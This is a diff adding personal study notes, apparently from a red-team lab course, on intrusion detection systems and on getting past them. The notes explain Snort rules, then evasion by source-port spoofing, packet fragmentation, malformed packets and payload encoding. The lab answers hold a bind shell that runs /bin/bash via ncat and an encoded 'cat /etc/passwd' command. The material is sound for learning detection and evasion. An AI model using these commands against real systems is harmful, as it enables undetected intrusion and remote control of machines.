@@ -1,0 +1,161 @@
+
+Introduction
+
+Intrusion Detection System (IDS): detects nework or system intrusions. 
+Intrusion Detection and Prevension System (IDPS): detect and prevent system intrusions
+
+Snort - network intrusion and detection system
+-can drop offending connections
+-set up as inline and to bridge two or more network cards
+
+1. Host-based IDS: installed on an OS along with other running apps
+2. Network-based IDS: server to monitor the network traffic
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+IDS Engine Types
+1. Benign traffic: no alert
+2. Malicious traffic: IDS detect
+
+IDS detection recognition
+1. Signature-based: requires full knowledge of malicious traffic using explicit rules to match against (anti-virus)
+2. Anomaly-based: requires knowledge of regular traffic and anything outside that is flagged as absnormal (track abnormal behavior)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+IDS/IPS Rule Triggering
+
+Rule Header - Rule Options
+1. Action: alert, log, pass, drop, reject
+2. Protocol: TCP, UDP, ICMP, IP
+3. Source IP/PORT: [IP/port or IP/any]
+4. Direction of flow: -> (source to destination), <> (bidirectional)
+5. Destination IP/PORT: [IP/port or IP/any]
+
+example: drop icmp any any -> any any (msg: "ICMP Ping Scan"; dsize:0; sid:1000020; rev: 1;)
+
+ASCII: written between 2 pipe characters 
+example: "|6e 63 61 74|" -  similar to "ncat"
+
+flow:established -> look at streams by a TCP 3-way handshake (established connections)
+
+10.14.17.226
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Evasion via protocol manipulation
+
+-requires manipulation of traffic so it doesn't match any IDS/IPS signatures
+1. Protocol manipulation
+2. Payload manipulation
+3. Route Manipulation
+4. Tactical Denial of Service (Dos)
+
+
+Rely on a Different Protocol:
+-IDS/IPS can be configured to block certain protocols
+-web browser ports 80 and 443
+Ncat
+-default uses TCP connection 
+-can use UDP with -u option
+-listen using TCP
+ncat -lvnp [PORT_NUM]
+-connect to ncat instance
+ncat [Target IP] [PORT]
+-(-l): listen
+-(-v): verbose
+-(-n): avoid resolving hostnames
+-(-p): port number
+-connect using UDP
+ncat -ulvnp [PORT_num]
+-connect to ncat instance on UDP port
+nc -u [Target IP] [PORT_num]
+
+Manipulate (Source) TCP/UDP Port
+-TCP and UDP source and destination ports are inspected by most security solutions
+-eg TCP port 22 would be interpreted as SSH traffic unless the data can be analyzed with deep packet inspection
+-make port scanning traffic resemble web browsing
+-(-g) [Port_num] or --source-port [Port Number]
+-use scanning target to appear as HTTP server exchange
+nmap -sS -Pn -g 80 -F [IP]
+-use scanning target to appear as DNS server exhange
+nmap -sU -Pn -g 53 -F [IP]
+-connect using ncat but appear as HTTP server
+-attacker machine: ncat -lvnp 80
+-target machine: nc [Attacker_IP] 80
+-connect using ncat but appear as DNS server
+-attacker machine: ncat -ulvnp 53
+-target machine: ncat -u [Attacker_IP] 53
+
+Use Session Splicing (IP Packet Fragmentation)
+-break packet(s) related to an attack into smaller packets -> avoid matching IDS signatures
+-nmap offers options to fragment packets
+-f: set data in IP packet to 8 bytes
+-ff: set data in IP packet to 16 bytes
+--mtu SIZE: provide a custom size for data carried (multiple of 8)
+-program Fragroute: fragmetn packets into specific sizes
+fragroute.conf > ip_frag 16
+fragroute -f fragroute.conf [HOST] 
+
+Sending Invalid Packets
+-scan target using packets that have invalid TCP/UDP checksum
+-scan target using packets that have invalid TCP flags
+-send packets with wrong tcp/udp checksum using --badsum
+-send with custom TCP flags --scanflags 
+URG - urgent
+ACK - Acknowledge
+PSH - push
+RST - reset
+SYN - Synchronize
+FIN - Finish
+-eg set flag to synchornize, reset, finish
+--scanflags SYNRSTFIN
+-craft your packets with custom fields using hping3
+-(-t) or (--ttl): Time to live 
+-(-b) or (--badsum): send packets with a bad UDP/TCP checksum
+-(-S) TCP SYN, (-A) ACK, (-P) PUSH, (-U) URG, (-F) FIN, (-R) RST flags
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Evasion via payload manipulation
+1. Obfuscate and Encode the payload
+-encode to Base64
+base64 payload.txt
+-url encoding
+urlencode payload.txt
+-use escaped code
+icyberchef.com
+
+2. use encrypted communication channel ( create key, listen on attacker machine, connect to attacker machine)
+-returns key and certificate
+-.pem (privacy enchanced mail) - requires concatenated private key and certificate
+
+3. Modify the data
+-modify the command
+-extra spaces or using nc or socat instead of ncat
+
+answers:
+1. echo cat /etc/passwd > testfile.txt
+base64 test_file.txt
+Y2F0IC9ldGMvcGFzc3dkCg==
+
+2. echo NZRWC5BAFVWCAOBQHAYAU=== > testfile2.txt
+base32 --decode testfile2.txt
+ncat  -l 8080
+
+3. openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
+cat thm-reverse.crt
+-----BEGIN CERTIFICATE-----
+
+4. cat thm-reverse.key
+-----END PRIVATE KEY-----
+
+5. http://[IP]:8080
+ncat  -lvnp    1234  -e /bin/bash
+ncat [IP] 1234
+whoami
+redteamnetsec
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
